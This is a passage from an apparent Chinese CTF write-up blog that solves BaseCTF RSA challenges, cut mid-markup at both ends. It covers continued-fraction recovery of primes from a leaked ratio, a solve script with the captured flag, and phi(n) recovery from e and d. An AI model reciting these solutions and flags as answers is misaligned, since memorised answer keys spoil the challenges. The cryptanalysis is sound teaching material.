class="hljs-number">1024</span>)<br>n=p*q<br><br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>,c)<br><br>decimal.getcontext().prec = <span class="hljs-number">648</span><br>P=decimal.Decimal(p)<br>Q=decimal.Decimal(q)<br>leak=decimal.Decimal((<span class="hljs-number">3</span>*P*Q-<span class="hljs-number">1</span>)/(<span class="hljs-number">3</span>*Q*Q))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;leak =&quot;</span>,leak)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c = 11032748573623426359632659657114807044712138586316710250985606809252700461490504487308849626514319062562557448839550994242999334882617031487618174168038491566640081840111747765753878087564318833273878755416584962921669911444225959335274753391800995531023212276838665202257007640354237043291129197348884914956663597240094662207929658519596987351984403258345205873566463643624175318315064440456858013874962784792564480286904620663695194689839431808082976248378509181327101557380978849545906691903896662095520288964101796965095129861467059775556110616007889846240936219381379219605528051627402300580239311202137582442057</span><br><span class="hljs-string">leak = 0.829374344780877053838760251345359097311540811993463349625630085472892814959843248358036249898871908548743719153319438638517170060651237635838827482534816419091949205584951292517303330452910012749674475329235689229498752425379611083979518257734473992186831474208400813283887045691145481237726578827559198828469462343342343287720369159899636816373592067698883361360269728719786071024354151682314608072902347335691012713629816579496252896260869382806838857194293618332286500427694077400072428506897829689703872985954772105672992293334668485358785863779749153981721900135318166811250762946069962348114491411585418993494561587403918162681937152503739843</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>直接摘抄的wiener攻击的思想，连分数定理：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">∣</mo><mi>a</mi><mo>−</mo><mfrac><mi>c</mi><mi>d</mi></mfrac><mo fence="true">∣</mo></mrow><mo>&lt;</mo><mfrac><mn>1</mn><mrow><mn>2</mn><mo>∗</mo><msup><mi>d</mi><mn>2</mn></msup></mrow></mfrac><mspace linebreak="newline"></mspace><mtext>可得</mtext><mfrac><mi>c</mi><mi>d</mi></mfrac><mtext>就是</mtext><mi>a</mi><mtext>的一个连分数近似</mtext></mrow><annotation encoding="application/x-tex">\left|a-\frac{c}{d}\right|&lt;\frac{1}{2*d^2}\\可得\frac{c}{d}就是a的一个连分数近似</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.859975em;vertical-align:-0.686em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.173975em;"><span style="top:-1.955985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.556985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.572975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.173975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6500149999999999em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.173975em;"><span style="top:-1.955985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.556985em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.572975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.173975em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6500149999999999em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.7935600000000003em;vertical-align:-0.686em;"></span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">得</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">连</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">近</span><span class="mord cjk_fallback">似</span></span></span></span></span></p><p>（至于定理证明我也不会，不好意思喵）</p><p>推导：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo>=</mo><mfrac><mrow><mn>3</mn><mo>∗</mo><mi>P</mi><mo>∗</mo><mi>Q</mi><mo>−</mo><mn>1</mn></mrow><mrow><mn>3</mn><mo>∗</mo><mi>Q</mi><mo>∗</mo><mi>Q</mi></mrow></mfrac><mspace linebreak="newline"></mspace><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo>=</mo><mfrac><mi>P</mi><mi>Q</mi></mfrac><mo>−</mo><mfrac><mn>1</mn><mrow><mn>3</mn><mo>∗</mo><msup><mi>Q</mi><mn>2</mn></msup></mrow></mfrac><mspace linebreak="newline"></mspace><mrow><mo fence="true">∣</mo><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mo>−</mo><mfrac><mi>P</mi><mi>Q</mi></mfrac><mo fence="true">∣</mo></mrow><mo>=</mo><mfrac><mn>1</mn><mrow><mn>3</mn><mo>∗</mo><msup><mi>Q</mi><mn>2</mn></msup></mrow></mfrac><mo>&lt;</mo><mfrac><mn>1</mn><mrow><mn>2</mn><mo>∗</mo><msup><mi>Q</mi><mn>2</mn></msup></mrow></mfrac><mspace linebreak="newline"></mspace><mtext>之后计算</mtext><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mtext>的连分数，即可得到</mtext><mi>p</mi><mtext>和</mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">leak=\frac{3*P*Q-1}{3*Q*Q}\\leak=\frac{P}{Q}-\frac{1}{3*Q^2}\\\left|leak-\frac{P}{Q}\right|=\frac{1}{3*Q^2}&lt;\frac{1}{2*Q^2}\\之后计算leak的连分数，即可得到p和q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.24077em;vertical-align:-0.8804400000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3603299999999998em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">Q</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.2407700000000004em;vertical-align:-0.8804400000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">Q</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.20188em;vertical-align:-0.8804400000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:2.42999em;vertical-align:-0.9500199999999999em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4799700000000002em;"><span style="top:-1.65598em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.25698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.85798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.87897em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.47997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">Q</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4799700000000002em;"><span style="top:-1.65598em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.25698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.85798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.87897em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-3.47997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500199999999999em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.20188em;vertical-align:-0.8804400000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.20188em;vertical-align:-0.8804400000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">连</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">和</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">11032748573623426359632659657114807044712138586316710250985606809252700461490504487308849626514319062562557448839550994242999334882617031487618174168038491566640081840111747765753878087564318833273878755416584962921669911444225959335274753391800995531023212276838665202257007640354237043291129197348884914956663597240094662207929658519596987351984403258345205873566463643624175318315064440456858013874962784792564480286904620663695194689839431808082976248378509181327101557380978849545906691903896662095520288964101796965095129861467059775556110616007889846240936219381379219605528051627402300580239311202137582442057</span><br>leak = <span class="hljs-number">0.829374344780877053838760251345359097311540811993463349625630085472892814959843248358036249898871908548743719153319438638517170060651237635838827482534816419091949205584951292517303330452910012749674475329235689229498752425379611083979518257734473992186831474208400813283887045691145481237726578827559198828469462343342343287720369159899636816373592067698883361360269728719786071024354151682314608072902347335691012713629816579496252896260869382806838857194293618332286500427694077400072428506897829689703872985954772105672992293334668485358785863779749153981721900135318166811250762946069962348114491411585418993494561587403918162681937152503739843</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>cf = continued_fraction(leak)<br>convers = cf.convergents()<br><span class="hljs-keyword">for</span> pkd <span class="hljs-keyword">in</span> convers:<br>    <span class="hljs-comment"># possible k, d</span><br>    pp, pq = pkd.as_integer_ratio()<br>    pp=<span class="hljs-built_in">int</span>(pp)<br>    <span class="hljs-keyword">if</span> pp.bit_length()==<span class="hljs-number">1024</span> <span class="hljs-keyword">and</span> isPrime(pp):<br>        flag=long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c,inverse(e,pp-<span class="hljs-number">1</span>),pp)))<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Base&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#b&#x27;BaseCTF&#123;9431ee53-5d5c-4b0b-956f-1eafff6c9e87&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="没有n啊_pro"><a class="markdownIt-Anchor" href="#没有n啊_pro"></a> 没有n啊_pro</h3><blockquote><p>前言：</p><p>在之前西瓜杯的比赛中我出一次这个题，然后在前几天sigenzhe师傅在我博客低下说了另一种不用给x的解法，所以我重新生成了一下数据搬了过来，感谢sigenzhe师傅。</p><p>当时博客里的sigenzhe师傅的原话：</p><p>《给你d又怎样》 这道题可以不要 hint 也能做出来。<br />n为256位，那phi(n)的位数在256、255、254这个区间内。有了e和d，ed=k * phi(n) + 1 。且 k &lt; e 可以通过爆破k的方法 得到几十个可能的 phi(n) 。而且最重要是 phi(n)的位数小于256，是可以分解的，phi(n) = (p-1) * (q-1) ，那我们通过组合phi(n)的因子，就有可以得到（p-1) 。<br />最终检测退出的条件是，因子组合排列相乘，只要位数是128 且 + 1后是素数即可。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br>flag=<span class="hljs-string">b&#x27;BaseCTF&#123;&#125;&#x27;</span><br>m=bytes_to_long(flag)<br>p=getPrime(<span class="hljs-number">128</span>)<br>q=getPrime(<span class="hljs-number">128</span>)<br><br>n=p*q<br>e=<span class="hljs-number">65537</span><br><br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br><br><span class="hljs-keyword">assert</span> d&lt;phi<br><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d =&quot;</span>,d)<br></code></pre></td></tr></table></figure><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>已知：</mtext><mi>e</mi><mo>∗</mo><mi>d</mi><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>那么</mtext><mi>e</mi><mo>∗</mo><mi>d</mi><mo>=</mo><mn>1</mn><mo>+</mo><mi>k</mi><mo>∗</mo><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mtext>，</mtext><mi>k</mi><mo>∗</mo><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>e</mi><mo>∗</mo><mi>d</mi><mo>−</mo><mn>1</mn><mspace linebreak="newline"></mspace><mtext>为了方便想我还给了一个条件</mtext><mi>d</mi><mo>&lt;</mo><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>可以得到</mtext><mi>k</mi><mo>&lt;</mo><mi>e</mi><mtext>，我们通过遍历</mtext><mi>e</mi><mtext>的范围即可得到多个</mtext><msub><mi>k</mi><mi>i</mi></msub><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mtext>的范围可以推测为</mtext><mn>256</mn><mspace linebreak="newline"></mspace><mtext>之后可以求解</mtext><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mtext>的全分解，对全分解进行排列组合即可得到</mtext></mrow><annotation encoding="application/x-tex">已知：e*d\equiv1\mod\phi(n)\\那么e*d=1+k*\phi(n)，k*\phi(n)=e*d-1\\为了方便想我还给了一个条件d&lt;\phi(n)\\可以得到k&lt;e，我们通过遍历e的范围即可得到多个k_i\phi(n)\\\phi(n)的范围可以推测为256\\之后可以求解\phi(n)的全分解，对全分解进行排列组合即可得到</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">已</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">：</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">么</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord 